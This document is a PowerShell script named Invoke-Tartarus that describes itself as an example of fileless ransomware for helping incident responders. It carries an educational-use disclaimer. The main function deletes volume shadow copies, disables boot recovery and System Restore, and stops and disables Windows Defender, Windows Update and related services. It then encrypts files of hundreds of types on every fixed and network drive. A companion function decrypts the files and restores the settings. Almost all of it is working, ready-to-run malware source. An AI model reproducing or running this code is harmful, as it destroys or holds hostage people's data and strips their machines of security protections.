set-strictMode -version 2.0

function Invoke-Tartarus
{
<#

.DISCLAIMER

Warning! Use at your own risk! This script is an example of actual threat and was created to help responder to understand them.

Any action and/or activities related to the material contained within this blog is solely your responsibility. The misuse of the information in this website can result in criminal charges brought against the persons in question. The authors will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this website to break the law.

This script is published for educational use only. I am no way responsible for any misuse of the information.

.SYNOPSIS

Fileless "Ransomware" example.

Author: @pabraeken

License: BSD 3-Clause

.DESCRIPTION

Tartarus is expected to be launched from an Empire agent and therefore from the memory. It uses symmetric encryption and the key is store into the memory. This kind of attack is extremely challenging as it's bypass traditionnal malware detection by running directly in memory. The ransomware can be configured to run with a specific execution time and then it kills itself.

.PARAMETER MaxExecutionTime

This parameter allows to configure the malware execution time before killing itself

.PARAMETER IV

Initialization vector.

.PARAMETER Key

The encryption key.

.EXAMPLE
> Invoke-Tartarus -MaxExecutionTime 3600 -IV 'RvQUR/CILm1UiQN/u+BABA==' -Key 'lvk3AlqoxLFbKjHXTuHs500WEM7Y+6zAX1Y/F7kD+5U='
Executes the malware for 3600 seconds then the malware kills itself.

#>
Param(
    [Parameter(Position = 0)]
    [int]
    $MaxExecutionTime=300,

    [Parameter(ParameterSetName = "IV", Position = 1)]
    [String]
    $IV,

    [Parameter(ParameterSetName = "IV", Position = 2)]
    [String]
    $Key
)
    $stopWatch = [system.diagnostics.stopwatch]::StartNew()        

    # Manage to delete all snapshots on the target machine and disable the related Windows service
    # Remove all snapshots
    gwmi Win32_Shadowcopy|%{if($($_.ClientAccessible) -eq "True"){$_.Delete()}};
    # Stop the Volume Snapshot Service
    spsv vss -ErrorAction SilentlyContinue;
    # Disable the Volume Snapshot Service
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
    set-service vss -StartupType Disabled};

    # Disable recovery options
    # Disable Startup Repair from trying to start when a problem is detected
    bcdedit /set recoveryenabled No|Out-Null;
    # Disable Windows recovery at startup
    bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null;

    # Stop and disable the services Wscsvc - WinDefend - Wuauserv - BITS - ERSvc - WerSvc
    spsv Wscsvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
    set-service Wscsvc -StartupType Disabled};
    spsv WinDefend -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WinDefend'").StartMode) -ne "Disabled"){
    set-service WinDefend -StartupType Disabled};
    spsv Wuauserv -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wuauserv'").StartMode) -ne "Disabled"){
    set-service Wuauserv -StartupType Disabled};
    spsv BITS -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='BITS'").StartMode) -ne "Disabled"){
    set-service BITS -StartupType Disabled};
    spsv ERSvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='ERSvc'").StartMode) -ne "Disabled"){
    set-service ERSvc -StartupType Disabled};
    spsv WerSvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WerSvc'").StartMode) -ne "Disabled"){
    set-service WerSvc -StartupType Disabled};

    $hklm=2147483650;$hkcu = 2147483649;
    $reg=[WMIClass]"ROOT\DEFAULT:StdRegProv";
    # Disable the security center notifications
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}";
    $reg.DeleteKey($hklm, $key)|out-null;
    # Disable the system restore
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRestore";
    $reg.CreateKey($hklm, $key)|out-null;
    $reg.SetDWORDValue($hklm, $key, "DisableSR", "1")|out-null;
    # To hide Windows Defender notification icon
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    $reg.DeleteValue($hklm, $key, "WindowsDefender")|out-null;
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
    $reg.DeleteValue($hklm, $key, "WindowsDefender")|out-null;
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    $reg.DeleteValue($hkcu, $key, "Windows Defender")|out-null;
    $key="SOFTWARE\Policies\Microsoft\Windows Defender";
    $reg.SetDWORDValue($hklm, $key, "DisableAntiSpyware", "1")|out-null;

    $aesManaged=new-object "System.Security.Cryptography.AesManaged";
    $aesManaged.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aesManaged.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;
    $aesManaged.BlockSize=128;
    $aesManaged.KeySize=256;
    $aesManaged.IV=[System.Convert]::FromBase64String($IV);
    $aesManaged.Key=[System.Convert]::FromBase64String($Key);
    $encryptor=$aesManaged.CreateEncryptor();
    $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;
    foreach($drive in $drives){
        $files=gci "$($drive.Name)" -Recurse -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv;
        foreach($file in $files) {
            $bytes=[System.IO.File]::ReadAllBytes($($file.FullName));
            $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
            [byte[]] $fullData=$aesManaged.IV + $encryptedData;
            [System.IO.File]::WriteAllBytes($($file.FullName),$fullData)        
            if($stopWatch.Elapsed.TotalSeconds -ge $MaxExecutionTime){
                $aesManaged.Dispose()
                Stop-Process -Id $Pid -Force
            }
        }
    };
    $aesManaged.Dispose()
    Stop-Process -Id $Pid -Force
}

function Create-AesManagedObject() {
<#
.SYNOPSIS

Create an Aes Managed Object

Author: @pabraeken

License: BSD 3-Clause
#>
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    
    $aesManaged
}
function Create-AesKey() {
<#
.SYNOPSIS

Create an Aes Key Object

Author: @pabraeken

License: BSD 3-Clause

.Example
$key = Create-AesKey
$key.IV
$key.Key

Output: 
bYsk6zmJmWtt8pZFC9wVuw==
eZpMGPKSeOkhbm1qexalV5rFjKB7MF7MUIu/sbrZEN8=
#>
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    $aesObject = New-Object PSObject
    $IV =  [System.Convert]::ToBase64String($aesManaged.IV)
    Add-Member -InputObject $aesObject -MemberType NoteProperty -Name "IV" -Value $IV    
    $key = [System.Convert]::ToBase64String($aesManaged.Key)
    Add-Member -InputObject $aesObject -MemberType NoteProperty -Name "Key" -Value $key
    $aesObject 
}

function Invoke-AntiTartarus
{
<#
.SYNOPSIS

Recover from the attack.

Author: @pabraeken

License: BSD 3-Clause

.DESCRIPTION

.PARAMETER IV

Initialization vector.

.PARAMETER Key

The encryption key.

.EXAMPLE
> Invoke-AntiTartarus -IV 'RvQUR/CILm1UiQN/u+BABA==' -Key 'lvk3AlqoxLFbKjHXTuHs500WEM7Y+6zAX1Y/F7kD+5U='

#>
Param(
    [Parameter(ParameterSetName = "IV", Position = 0)]
    [String]
    $IV,

    [Parameter(ParameterSetName = "IV", Position = 1)]
    [String]
    $Key
)
    $IV = [System.Convert]::FromBase64String("RvQUR/CILm1UiQN/u+BABA==")
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    $aesManaged.IV = $IV
    $aesManaged.Key = [System.Convert]::FromBase64String("lvk3AlqoxLFbKjHXTuHs500WEM7Y+6zAX1Y/F7kD+5U=")  
    $decryptor = $aesManaged.CreateDecryptor();
    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4" | Select Name
    foreach($drive in $drives){
        $files = get-childitem "$($drive.Name)" -Recurse -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv         
        foreach($file in $files) {   
            $fileToDecrypt = $file.FullName        
            $encryptedFile = [System.IO.File]::ReadAllBytes($fileToDecrypt)     
            $bytes = $encryptedFile #[System.Convert]::FromBase64String($encryptedFile)
            $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
            #$unencryptedData = [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
            [System.IO.File]::WriteAllBytes($fileToDecrypt,$unencryptedData)       
        }
    }
    $aesManaged.Dispose()  

    # Restore Windows Services
    Set-Service vss -StartupType Manual
    Set-Service Wscsvc -StartupType Automatic
    Set-Service WinDefend -StartupType Automatic
    Set-Service Wuauserv -StartupType Automatic
    Set-Service BITS -StartupType Automatic
    Set-Service ERSvc -StartupType Automatic
    Set-Service WerSvc -StartupType Automatic   

    # Restore recovery options
    # Enable Startup Repair
    bcdedit /set recoveryenabled Yes|Out-Null;
    # Enable Windows recovery at startup
    bcdedit /set bootstatuspolicy DisplayAllFailures|Out-Null;

    $hklm=2147483650;$hkcu = 2147483649;
    $reg=[WMIClass]"ROOT\DEFAULT:StdRegProv";
    # Restore the security center notifications
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}";
    $reg.CreateKey($hklm, $key)|out-null;
    # Enable the system restore
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRestore";    
    $reg.SetDWORDValue($hklm, $key, "DisableSR", "")|out-null;

    $key="SOFTWARE\Policies\Microsoft\Windows Defender";
    $reg.SetDWORDValue($hklm, $key, "DisableAntiSpyware", "")|out-null;
  
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    $reg.SetExpandedStringValue($hklm, $key, "WindowsDefender", "%ProgramFiles%\Windows Defender\MSASCuiL.exe")|out-null;            
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
    $stRestore = ([byte[]](0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $reg.SetBinaryValue($hklm, $key, "WindowsDefender", $stRestore)|out-null;
}
